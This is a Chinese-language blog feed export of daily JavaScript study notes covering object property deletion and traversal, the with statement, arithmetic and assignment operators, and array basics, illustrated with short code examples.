<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  key1: <span class="number">1</span>,</span><br><span class="line">  key2: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(obj);</span><br><span class="line"><span class="comment">// [&#x27;key1&#x27;, &#x27;key2&#x27;]</span></span><br></pre></td></tr></table></figure>

<h5 id="4-2-4-属性的删除"><a href="#4-2-4-属性的删除" class="headerlink" title="4.2.4 属性的删除"></a>4.2.4 属性的删除</h5><p><code>delete</code>命令用于删除对象的属性，删除成功后返回<code>true</code>,如果删除一个不存在的属性，delete不报错，而且返回<code>true</code>,因此，不能根据delete命令的结果，认定某个属性是存在的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.keys(obj) <span class="comment">// [&quot;p&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.p <span class="comment">// true</span></span><br><span class="line">obj.p <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">Object</span>.keys(obj) <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.p <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>只有一种情况，<code>delete</code>命令会返回<code>false</code>，那就是该属性存在，且不得删除</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.defineProperty(&#123;&#125;, <span class="string">&#x27;p&#x27;</span>, &#123;</span><br><span class="line">  value: <span class="number">123</span>,</span><br><span class="line">  configurable: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.p <span class="comment">// 123</span></span><br><span class="line"><span class="keyword">delete</span> obj.p <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>另外，需要注意的是，delete命令只能删除对象本身的属性，无法删除继承的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">delete</span> obj.toString <span class="comment">// true</span></span><br><span class="line">obj.toString <span class="comment">// function toString() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>toString</code>是对象<code>obj</code>继承的属性，虽然<code>delete</code>命令返回<code>true</code>，但该属性并没有被删除，依然存在。这个例子还说明，即使<code>delete</code>返回<code>true</code>，该属性依然可能读取到值</p>
<h5 id="4-2-5-判断属性是否存在"><a href="#4-2-5-判断属性是否存在" class="headerlink" title="4.2.5 判断属性是否存在"></a>4.2.5 判断属性是否存在</h5><p><code>in</code>运算符用于检查对象是否包含某个属性（注意，检查的是键名，不是键值），如果包含就返回<code>true</code>，否则返回<code>false</code>。它的左边是一个字符串，表示属性名，右边是一个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="string">&#x27;p&#x27;</span> <span class="keyword">in</span> obj <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;toString&#x27;</span> <span class="keyword">in</span> obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>它不能识别哪些属性是对象自身的,这时，可以使用对象的<code>hasOwnProperty</code>方法判断一下，是否为对象自身的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;toString&#x27;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(obj.hasOwnProperty(<span class="string">&#x27;toString&#x27;</span>)) <span class="comment">// false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4-2-6-对象的遍历"><a href="#4-2-6-对象的遍历" class="headerlink" title="4.2.6 对象的遍历"></a>4.2.6 对象的遍历</h5><p><code>for...in</code>循环用来遍历一个对象的全部属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;键名：&#x27;</span>, i);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;键值：&#x27;</span>, obj[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 键名： a</span></span><br><span class="line"><span class="comment">// 键值： 1</span></span><br><span class="line"><span class="comment">// 键名： b</span></span><br><span class="line"><span class="comment">// 键值： 2</span></span><br><span class="line"><span class="comment">// 键名： c</span></span><br><span class="line"><span class="comment">// 键值： 3</span></span><br></pre></td></tr></table></figure>
<p><code>for...in</code>循环有两个使用注意点</p>
<ul>
<li>它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性</li>
<li>它不仅遍历对象自身的属性，还遍历继承的属性</li>
</ul>
<p>举例来说，对象都继承了toString属性，但是for…in循环不会遍历到这个属性,因为它默认是“不可遍历”的<br>一般情况下，都是只想遍历对象自身的属性，所以使用<code>for...in</code>的时候，应该结合使用<code>hasOwnProperty</code>方法，在循环内部判断一下，某个属性是否为对象自身的属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123; <span class="attr">name</span>: <span class="string">&#x27;老张&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> person) &#123;</span><br><span class="line">  <span class="keyword">if</span> (person.hasOwnProperty(key)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// name</span></span><br></pre></td></tr></table></figure>


<h4 id="4-3-with语句"><a href="#4-3-with语句" class="headerlink" title="4.3 with语句"></a>4.3 with语句</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> (对象) &#123;</span><br><span class="line">  语句;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它的作用是操作同一个对象的多个属性时，提供一些书写的方便</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p1: <span class="number">1</span>,</span><br><span class="line">  p2: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">with</span> (obj) &#123;</span><br><span class="line">  p1 = <span class="number">4</span>;</span><br><span class="line">  p2 = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">obj.p1 = <span class="number">4</span>;</span><br><span class="line">obj.p2 = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="keyword">with</span> (<span class="built_in">document</span>.links[<span class="number">0</span>])&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(href);</span><br><span class="line">  <span class="built_in">console</span>.log(title);</span><br><span class="line">  <span class="built_in">console</span>.log(style);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.links[<span class="number">0</span>].href);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.links[<span class="number">0</span>].title);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.links[<span class="number">0</span>].style);</span><br></pre></td></tr></table></figure>

<p>注意，如果<code>with</code>区块内部有变量的赋值操作，必须是当前对象已经存在的属性，否则会创造一个当前作用域的全局变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">with</span> (obj) &#123;</span><br><span class="line">  p1 = <span class="number">4</span>;</span><br><span class="line">  p2 = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.p1 <span class="comment">// undefined</span></span><br><span class="line">p1 <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>

<p>这非常不利于代码的除错和模块化，编译器也无法对这段代码进行优化，只能留到运行时判断，这就拖慢了运行速度。因此，建议不要使用with语句，可以考虑用一个临时变量代替with</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">with</span>(<span class="params">obj1.obj2.obj3</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p1 + p2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以写成</span></span><br><span class="line"><span class="keyword">var</span> temp = obj1.obj2.obj3;</span><br><span class="line"><span class="built_in">console</span>.log(temp.p1 + temp.p2);</span><br></pre></td></tr></table></figure>


<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS数据类型-对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0006</title>
    <url>/2021/05/08/%E6%89%93%E5%8D%A10006/</url>
    <content><![CDATA[<p><font color=#cd8c95>你要离开我吗？别走好吗？跑起来。</font></p>
<h2 id="JS运算符"><a href="#JS运算符" class="headerlink" title="JS运算符"></a>JS运算符</h2><h3 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符"></a>1.算术运算符</h3><h4 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h4><p>JavaScript 共提供10个算术运算符，用来完成基本的算术运算</p>
<ul>
<li>加法运算符：<code>x + y</code></li>
<li>减法运算符： <code>x - y</code></li>
<li>乘法运算符： <code>x * y</code></li>
<li>除法运算符：<code>x / y</code></li>
<li>指数运算符：<code>x ** y</code></li>
<li>余数运算符：<code>x % y</code></li>
<li>自增运算符：<code>++x</code> 或者 <code>x++</code></li>
<li>自减运算符：<code>--x</code> 或者 <code>x--</code></li>
<li>数值运算符： <code>+x</code></li>
<li>负数值运算符：<code>-x</code><span id="more"></span>
<h4 id="1-2-加法运算符"><a href="#1-2-加法运算符" class="headerlink" title="1.2 加法运算符"></a>1.2 加法运算符</h4></li>
</ul>
<h5 id="1-2-1-基本规则"><a href="#1-2-1-基本规则" class="headerlink" title="1.2.1 基本规则"></a>1.2.1 基本规则</h5><p>加法运算符<code>+</code>是最常见的运算符，用来求两个数值的和<br>1 + 1 //2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JavaScript 允许非数值的相加</span><br><span class="line">&#96;&#96;&#96;js</span><br><span class="line">true + true &#x2F;&#x2F; 2</span><br><span class="line">1 + true &#x2F;&#x2F; 2</span><br></pre></td></tr></table></figure>
<p>上面代码中，第一行是两个布尔值相加，第二行是数值与布尔值相加。这两种情况，布尔值都会自动转成数值，然后再相加</p>
<p>比较特殊的是，如果是两个字符串相加，这时加法运算符会变成连接运算符，返回一个新的字符串，将两个原字符串连接在一起</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;bc&#x27;</span> <span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果一个运算子是字符串，另一个运算子是非字符串，这时非字符串会转成字符串，再连接在一起</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">&#x27;a&#x27;</span> <span class="comment">// &quot;1a&quot;</span></span><br><span class="line"><span class="literal">false</span> + <span class="string">&#x27;a&#x27;</span> <span class="comment">// &quot;falsea&quot;</span></span><br></pre></td></tr></table></figure>
<p>加法运算符是在运行时决定，到底是执行相加，还是执行连接。也就是说，运算子的不同，导致了不同的语法行为，这种现象称为“重载”（overload）。由于加法运算符存在重载，可能执行两种运算，使用的时候必须很小心</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;3&#x27;</span> + <span class="number">4</span> + <span class="number">5</span> <span class="comment">// &quot;345&quot;</span></span><br><span class="line"><span class="number">3</span> + <span class="number">4</span> + <span class="string">&#x27;5&#x27;</span> <span class="comment">// &quot;75&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于从左到右的运算次序，字符串的位置不同会导致不同的结果</p>
<p>除了加法运算符，其他算术运算符（比如减法、除法和乘法）都不会发生重载。它们的规则是：所有运算子一律转为数值，再进行相应的数学运算</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> - <span class="string">&#x27;2&#x27;</span> <span class="comment">// -1</span></span><br><span class="line"><span class="number">1</span> * <span class="string">&#x27;2&#x27;</span> <span class="comment">// 2</span></span><br><span class="line"><span class="number">1</span> / <span class="string">&#x27;2&#x27;</span> <span class="comment">// 0.5</span></span><br></pre></td></tr></table></figure>

<h5 id="1-2-2-对象的相加"><a href="#1-2-2-对象的相加" class="headerlink" title="1.2.2 对象的相加"></a>1.2.2 对象的相加</h5><p>如果运算子是对象，必须先转成原始类型的值，然后再相加</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line">obj + <span class="number">2</span> <span class="comment">// &quot;[object Object]2&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>转成原始类型的值是<code>[object Object]</code>，再加<code>2</code>就得到了上面的结果<br>对象转成原始类型的值，规则如下:<br>首先，自动调用对象的<code>valueOf</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line">obj.valueOf() <span class="comment">// &#123; p: 1 &#125;</span></span><br></pre></td></tr></table></figure>
<p>般来说，对象的<code>valueOf</code>方法总是返回对象自身，这时再自动调用对象的<code>toString</code>方法，将其转为字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line">obj.valueOf().toString() <span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>
<p>对象的<code>toString</code>方法默认返回<code>[object Object]</code>，所以就得到了最前面那个例子的结果</p>
<p>知道了这个规则以后，就可以自己定义<code>valueOf</code>方法或<code>toString</code>方法，得到想要的结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  valueOf: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj + <span class="number">2</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，我们定义<code>obj</code>对象的<code>valueOf</code>方法返回<code>1</code>，于是<code>obj + 2</code>就得到了<code>3</code>。这个例子中，由于<code>valueOf</code>方法直接返回一个原始类型的值，所以不再调用<code>toString</code>方法</p>
<p>下面是自定义toString方法的例子:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj + <span class="number">2</span> <span class="comment">// &quot;hello2&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>的<code>toString</code>方法返回字符串<code>hello</code>。前面说过，只要有一个运算子是字符串，加法运算符就变成连接运算符，返回连接后的字符串</p>
<p>这里有一个特例，如果运算子是一个<code>Date</code>对象的实例，那么会优先执行<code>toString</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">obj.valueOf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">1</span> &#125;;</span><br><span class="line">obj.toString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">obj + <span class="number">2</span> <span class="comment">// &quot;hello2&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>是一个<code>Date</code>对象的实例，并且自定义了<code>valueOf</code>方法和<code>toString</code>方法，结果<code>toString</code>方法优先执行</p>
<h4 id="1-3-余数运算符"><a href="#1-3-余数运算符" class="headerlink" title="1.3 余数运算符"></a>1.3 余数运算符</h4><p>余数运算符（<code>%</code>）返回前一个运算子被后一个运算子除，所得的余数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">12</span> % <span class="number">5</span> <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，运算结果的正负号由第一个运算子的正负号决定</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span> % <span class="number">2</span> <span class="comment">// -1</span></span><br><span class="line"><span class="number">1</span> % -<span class="number">2</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>所以，为了得到负数的正确余数值，可以先使用绝对值函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isOdd</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> n % <span class="number">2</span> === <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">isOdd(-<span class="number">5</span>) <span class="comment">// false</span></span><br><span class="line">isOdd(-<span class="number">4</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isOdd</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.abs(n % <span class="number">2</span>) === <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">isOdd(-<span class="number">5</span>) <span class="comment">// true</span></span><br><span class="line">isOdd(-<span class="number">4</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>余数运算符还可以用于浮点数的运算。但是，由于浮点数不是精确的值，无法得到完全准确的结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">6.5</span> % <span class="number">2.1</span></span><br><span class="line"><span class="comment">// 0.19999999999999973</span></span><br></pre></td></tr></table></figure>

<h4 id="1-4-自增和自减运算符"><a href="#1-4-自增和自减运算符" class="headerlink" title="1.4 自增和自减运算符"></a>1.4 自增和自减运算符</h4><p>自增和自减运算符，是一元运算符，只需要一个运算子。它们的作用是将运算子首先转为数值，然后加上1或者减去1。它们会修改原始变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">++x <span class="comment">// 2</span></span><br><span class="line">x <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">--x <span class="comment">// 1</span></span><br><span class="line">x <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码的变量<code>x</code>自增后，返回<code>2</code>，再进行自减，返回<code>1</code>。这两种情况都会使得，原始变量<code>x</code>的值发生改变<br>运算之后，变量的值发生变化，这种效应叫做运算的副作用（side effect）。自增和自减运算符是仅有的两个具有副作用的运算符，其他运算符都不会改变变量的值<br>自增和自减运算符有一个需要注意的地方，就是放在变量之后，会先返回变量操作前的值，再进行自增/自减操作；放在变量之前，会先进行自增/自减操作，再返回变量操作后的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> y = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">x++ <span class="comment">// 1</span></span><br><span class="line">++y <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>x</code>是先返回当前值，然后自增，所以得到<code>1</code>；<code>y</code>是先自增，然后返回新的值，所以得到<code>2</code></p>
<h4 id="1-5-数值运算符，负数值运算符"><a href="#1-5-数值运算符，负数值运算符" class="headerlink" title="1.5 数值运算符，负数值运算符"></a>1.5 数值运算符，负数值运算符</h4><p>数值运算符（<code>+</code>）同样使用加号，但它是一元运算符（只需要一个操作数），而加法运算符是二元运算符（需要两个操作数）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">+<span class="literal">true</span> <span class="comment">// 1</span></span><br><span class="line">+[] <span class="comment">// 0</span></span><br><span class="line">+&#123;&#125; <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，非数值经过数值运算符以后，都变成了数值（最后一行NaN也是数值）<br>负数值运算符（<code>-</code>），也同样具有将一个值转为数值的功能，只不过得到的值正负相反。连用两个负数值运算符，等同于数值运算符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">-x <span class="comment">// -1</span></span><br><span class="line">-(-x) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码最后一行的圆括号不可少，否则会变成自减运算符。</p>
<p>数值运算符号和负数值运算符，都会返回一个新的值，而不会改变原始变量的值</p>
<h4 id="1-6-指数运算符"><a href="#1-6-指数运算符" class="headerlink" title="1.6 指数运算符"></a>1.6 指数运算符</h4><p>指数运算符（<code>**</code>）完成指数运算，前一个运算子是底数，后一个运算子是指数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> ** <span class="number">4</span> <span class="comment">// 16</span></span><br></pre></td></tr></table></figure>
<p>注意，指数运算符是右结合，而不是左结合。即多个指数运算符连用时，先进行最右边的计算</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相当于 2 ** (3 ** 2)</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">3</span> ** <span class="number">2</span></span><br><span class="line"><span class="comment">// 512</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于指数运算符是右结合，所以先计算第二个指数运算符，而不是第一个</p>
<h4 id="1-7-赋值运算符"><a href="#1-7-赋值运算符" class="headerlink" title="1.7 赋值运算符"></a>1.7 赋值运算符</h4><p>赋值运算符（Assignment Operators）用于给变量赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将 1 赋值给变量 x</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将变量 y 的值赋值给变量 x</span></span><br><span class="line"><span class="keyword">var</span> x = y;</span><br></pre></td></tr></table></figure>
<p>赋值运算符还可以与其他运算符结合，形成变体。下面是与算术运算符的结合</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等同于 x = x + y</span></span><br><span class="line">x += y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x - y</span></span><br><span class="line">x -= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x * y</span></span><br><span class="line">x *= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x / y</span></span><br><span class="line">x /= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x % y</span></span><br><span class="line">x %= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x ** y</span></span><br><span class="line">x **= y</span><br></pre></td></tr></table></figure>
<p>下面是与位运算符的结合</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等同于 x = x &gt;&gt; y</span></span><br><span class="line">x &gt;&gt;= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x &lt;&lt; y</span></span><br><span class="line">x &lt;&lt;= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x &gt;&gt;&gt; y</span></span><br><span class="line">x &gt;&gt;&gt;= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x &amp; y</span></span><br><span class="line">x &amp;= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x | y</span></span><br><span class="line">x |= y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 x = x ^ y</span></span><br><span class="line">x ^= y</span><br></pre></td></tr></table></figure>
<p>这些复合的赋值运算符，都是先进行指定运算，然后将得到值返回给左边的变量</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS运算符-算术运算符</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0005</title>
    <url>/2021/05/07/%E6%89%93%E5%8D%A10005/</url>
    <content><![CDATA[<p><font color=#7bbfea>瞥扭的心态，得靠自个儿去调适~~~</font></p>
<h2 id="JS数据类型"><a href="#JS数据类型" class="headerlink" title="JS数据类型"></a>JS数据类型</h2><h3 id="6-数组"><a href="#6-数组" class="headerlink" title="6. 数组"></a>6. 数组</h3><h4 id="6-1-定义"><a href="#6-1-定义" class="headerlink" title="6.1 定义"></a>6.1 定义</h4><p>数组（array）是按次序排列的一组值，每个值都有编号（从0开始），整个数组用方括号表示</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>上面代码中的<code>a</code>、<code>b</code>就构成一个数组，两端的方括号是数组的标志。<code>a</code>是0号位置，<code>b</code>是1号位置</p>
<p>除了在定义时赋值，数组也可以先定义后赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"></span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>任何类型的数据，都可以放入数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [</span><br><span class="line">  &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;,</span><br><span class="line">  [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">arr[<span class="number">0</span>] <span class="comment">// Object &#123;a: 1&#125;</span></span><br><span class="line">arr[<span class="number">1</span>] <span class="comment">// [1, 2, 3]</span></span><br><span class="line">arr[<span class="number">2</span>] <span class="comment">// function ()&#123;return true;&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果数组的元素还是数组，就形成了多维数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]];</span><br><span class="line">a[<span class="number">0</span>][<span class="number">1</span>] <span class="comment">// 2</span></span><br><span class="line">a[<span class="number">1</span>][<span class="number">1</span>] <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>

<h4 id="6-2-数组的本质"><a href="#6-2-数组的本质" class="headerlink" title="6.2 数组的本质"></a>6.2 数组的本质</h4><p>本质上，数组属于一种特殊的对象。<code>typeof</code>运算符会返回数组的类型是<code>object</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="comment">// &quot;object&quot;</span></span><br></pre></td></tr></table></figure>

<p>数组的特殊性体现在，它的键名是按次序排列的一组整数（0，1，2…）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(arr)</span><br><span class="line"><span class="comment">// [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.keys</code>方法返回数组的所有键名。可以看到数组的键名就是整数0、1、2</p>
<p>由于数组成员的键名是固定的（默认总是0、1、2…），因此数组不用为每个元素指定键名，而对象的每个成员都必须指定键名。JavaScript 语言规定，对象的键名一律为字符串，所以，数组的键名其实也是字符串。之所以可以用数值读取，是因为非字符串的键名会被转为字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">arr[<span class="string">&#x27;0&#x27;</span>] <span class="comment">// &#x27;a&#x27;</span></span><br><span class="line">arr[<span class="number">0</span>] <span class="comment">// &#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>
